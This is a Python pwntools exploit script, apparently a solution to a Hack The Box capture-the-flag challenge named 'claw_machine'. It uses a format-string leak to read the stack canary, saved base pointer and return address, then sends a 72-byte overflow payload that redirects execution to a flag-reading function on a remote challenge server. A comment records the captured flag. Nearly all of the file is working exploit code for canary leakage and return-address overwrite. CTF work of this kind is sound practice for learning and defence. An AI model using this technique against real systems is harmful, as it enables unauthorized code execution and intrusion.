#Format String
#Python2 works while Python 3 failed...

from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

def detect(io, i):
	io.sendlineafter(':', '%'+str(i)+'$p.'+'%'+str(i+1)+'$p')
	io.recvuntil('Thank you for giving feedback ')
	buf = io.recvline()
	#print(f'{i},{i+1}: {buf}')

ip, port = '83.136.254.53', 33572
io = remote(ip, port)
#io = process('./claw_machine')

'''
for i in range(1, 128, 2):
	io = process('./claw_machine')

	io.sendlineafter('>>', '9')
	io.sendlineafter('>>', 'y')
	detect(io, i)
	io.sendlineafter(':', 'X')
	io.close()

#%21$p -> canary
#%23$p -> return address, addr_offset -> -0x1552

offset + canary + rbp + rip
  72   + canary +  8  + offset + read_flag (addr_offset + 0x0b84
'''

io.sendlineafter('>>', '9')
io.sendlineafter('>>', 'y')
io.sendlineafter(':', '%21$p%22$p%23$p')
io.recvuntil('Thank you for giving feedback ')
_, canary, rbp, ret_addr = io.recvline().decode().strip().split('0x')

#print(canary, ret_addr)
#payload = 72*b'A' + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(ret_addr,16) - 0x1552 + 0x0b84)
payload = 72*'A' + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(ret_addr,16) - 0x1552 + 0x0b84)
io.sendlineafter(':', payload)
print(io.recvall())

#HTB{gr4b_th3_fl4g_w1th_fmt}
